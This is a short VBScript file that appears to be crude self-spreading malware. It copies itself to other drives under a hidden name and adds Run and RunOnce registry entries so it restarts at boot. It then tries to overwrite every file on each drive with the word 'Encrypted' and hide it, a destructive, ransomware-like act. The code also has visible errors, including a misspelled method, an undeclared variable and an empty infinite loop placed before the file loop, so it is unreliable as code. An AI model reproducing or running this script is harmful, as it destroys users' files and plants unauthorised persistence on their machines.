option Explicit

Dim FileSysObject, File, Drives, Drive, cnt, items, dir, file1

cnt = 0

Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)

Set Drives = FileSysObject.Drives

For Each Drive in Drives
	if cnt > 0 then File.Copy (Chr(99 + cnt) + ":\WIN32BSCR.vbs")
	File.Attributes = 2
	cnt = cnt + 1
Next

Dim WshShell
Set WshShell = WScript.CreateObject("WScript.Shell")

cnt = 0

For Each Drive in Drives
	if cnt > 0 then 
		WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN32BSCRAL", Chr(99 + cnt) + ":\windows\WIN32BSCR.vbs"
		WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\WIN32BSCRAL", Chr(99 + cnt) + ":\windows\WIN32BSCR.vbs"
	end if
	cnt = cnt + 1
Next

Do while 1 < 3
loop
	For Each Drive in Drives
		if cnt > 0 then 
			Set dir = FileSysObject.GetFolder(Drive)
			For Each item in dir.Files
				file1 = FileSysObject.CreteTextFile(item.Name, True)
				file1.Write("Encrypted")
				file1.Attributes = 2
				file.close()
				WScript.sleep(60000*60)
			Next
		end if
		cnt = cnt + 1
	Next